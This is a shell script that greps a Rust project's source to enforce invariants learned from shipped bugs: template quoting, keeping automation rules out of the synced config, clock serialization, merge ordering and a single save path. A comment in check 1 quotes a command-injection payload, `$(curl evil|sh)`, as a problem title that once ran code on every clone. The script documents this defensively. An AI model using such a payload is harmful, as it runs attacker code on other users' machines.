#!/bin/sh
# Source-time checks for invariants that cost us something to learn.
#
# Each check below corresponds to a bug that actually shipped, or to a fence put
# up after one. They are greps rather than tests because each guards against a
# *future* edit: a sixth entity kind that forgets a serde attribute, a new save
# site that writes its own file, a refactor that swaps two comparisons. A unit
# test proves today's code works; these say what tomorrow's may not do.
#
#   ./scripts/check-invariants.sh
#
# Run from the repository root. Every check runs; the script exits non-zero if
# any failed, and each failure explains the history behind it, because the person
# who trips it will not be the person who wrote it.
#
# Deliberately *not* here: anything an ordinary test can assert about behaviour.
# A grep over source is the weakest check available, so it is reserved for cases
# where no value is observable at runtime. Two candidates were dropped on that
# rule — see the note at the bottom.

set -u

: "${RG:=rg}"
command -v "$RG" >/dev/null 2>&1 || {
    echo "check-invariants: needs ripgrep (rg) on PATH" >&2
    exit 127
}

total_failed=0 # across the whole run
check_failed=0 # within the check being run now

start() { check_failed=0; }

fail() {
    printf '\033[31mFAIL\033[0m %s\n' "$1"
    shift
    for line in "$@"; do printf '     %s\n' "$line"; done
    echo
    check_failed=1
    total_failed=1
}

# Report the current check's verdict with its own name, independent of any other.
done_check() {
    [ "$check_failed" -eq 0 ] && printf '\033[32mok\033[0m   %s\n' "$1"
    return 0
}

# --- 1. Shell templates must never carry a value into the command text -------
# Shipped as remote code execution: `{{title}}` was substituted literally, so a
# problem titled `$(curl evil|sh)` ran on every clone that fetched it. Values now
# travel in the process environment and the placeholder expands to a quoted
# reference to the variable.
start
if ! "$RG" -qF 'format!("\"${{{}}}\"", name)' src/automation.rs; then
    fail "automation templates may no longer expand to environment references" \
        "src/automation.rs: expand_template must emit \"\${JJJ_VAR_X}\" and pass the" \
        "value through the environment, never substitute it into the command text." \
        "Substituting it shipped once as remote code execution: a problem titled" \
        "\$(...) ran on every clone that fetched it."
fi
done_check "automation templates expand to environment references"

# --- 2. Automation rules must never be written into the synced config --------
# config.toml travels through the shared `jjj` bookmark, so a rule there is a
# shell command any collaborator can add to every clone. Deserialization still
# accepts the key, but only so pre-0.5.1 rules can be reported and dropped.
start
if ! "$RG" -qU 'skip_serializing\)\]\n[[:space:]]*pub automation: Vec<AutomationRule>' src/models/config.rs; then
    fail "ProjectConfig::automation lost its skip_serializing" \
        "src/models/config.rs: the field must stay #[serde(default, skip_serializing)]." \
        "config.toml is pushed to the shared bookmark; writing executable rules" \
        "there would let any collaborator run shell commands on every clone."
fi
done_check "automation rules are never serialized into the synced config.toml"

# --- 3. Every entity kind's clock must be absent when zero ------------------
# `lamport` was added to five kinds that already had corpora on disk. Serializing
# a zero would rewrite every file on first touch and make a record written before
# clocks existed read as a deliberate write at clock 0.
start
for k in problem solution critique finding milestone; do
    f="src/models/$k.rs"
    if [ ! -f "$f" ]; then
        fail "missing $f" "the kind list in this script is stale"
        continue
    fi
    "$RG" -q 'pub lamport: u64' "$f" || continue
    if ! "$RG" -qU 'skip_serializing_if = "crate::models::is_zero"\)\]\n[[:space:]]*pub lamport: u64' "$f"; then
        fail "$k: lamport is serialized even when zero" \
            "$f: the field needs" \
            "#[serde(default, skip_serializing_if = \"crate::models::is_zero\")]." \
            "Absent must mean zero, so that adding the clock did not rewrite every" \
            "existing file and an old record does not read as a write at clock 0."
    fi
done
done_check "every entity clock is omitted when zero"

# --- 4. Causality is compared before wall clock -----------------------------
# Ordering merges by `updated_at` made the *fastest* clock the permanent winner:
# a machine a year fast won every merge on every entity it touched, and a single
# bad NTP sync was enough to cause it.
start
lamport_line=$("$RG" -n 'l\.get\("lamport"\)' src/storage/merge.rs | head -1 | cut -d: -f1)
updated_line=$("$RG" -n 'l\.get\("updated_at"\)' src/storage/merge.rs | head -1 | cut -d: -f1)
if [ -z "$lamport_line" ]; then
    fail "merge no longer reads the Lamport clock at all" \
        "src/storage/merge.rs: pick_side must order by causality first."
elif [ -n "$updated_line" ] && [ "$updated_line" -lt "$lamport_line" ]; then
    fail "merge reads updated_at before the Lamport clock" \
        "src/storage/merge.rs: updated_at at line $updated_line precedes lamport at $lamport_line." \
        "Wall clocks are unverified and nothing can distinguish a machine that" \
        "wrote later from one whose clock is wrong. Ordering by them let a machine" \
        "a year fast win every merge on every entity it touched, permanently —" \
        "ten honest later edits by another clone all lost to one year-ahead record."
fi
done_check "merge compares the Lamport clock before updated_at"

# --- 5. No entity kind writes its own file ----------------------------------
# Sixty-odd save sites is what let the `claimed_at` column drift out of sync with
# its writers. One central `MetadataStore::save` stamps the clock and the
# timestamp and syncs the cache; a per-kind save that bypasses it rejoins the
# broken majority, silently and in only one kind.
start
for k in problems solutions critiques findings milestones; do
    f="src/storage/$k.rs"
    if [ ! -f "$f" ]; then
        fail "missing $f" "the kind list in this script is stale"
        continue
    fi
    if "$RG" -q 'atomic_write|fs::write' "$f"; then
        fail "$k writes entity bytes directly" \
            "$f: save_* must delegate to MetadataStore::save, the only place the" \
            "Lamport clock and updated_at are stamped and the cache is synced." \
            "Duplicated save sites are what let the claimed_at column drift out of" \
            "sync with its writers."
    fi
done
done_check "every kind saves through the one stamping path"

# --- Dropped, on the rule stated at the top ---------------------------------
# Two checks were written and then removed, because something stronger already
# covers them:
#
#   * "machine-local files stay out of the synced tree" — fetch's `classify` is
#     an allowlist ending in `_ => Target::Skip`, so an unrecognised path is
#     skipped by construction. There is nothing a grep could add, and the only
#     greppable form produced false positives on the constants themselves.
#
#   * "the installed skill matches the shipped one" — `jjj doctor` checks this at
#     runtime against the embedded copy, which also works for an installed binary
#     with no source tree. A grep cannot see another machine's skill file.

echo
if [ "$total_failed" -eq 0 ]; then
    printf '\033[32mall invariants hold\033[0m\n'
else
    printf '\033[31mone or more invariants broken — see above\033[0m\n'
fi
exit "$total_failed"
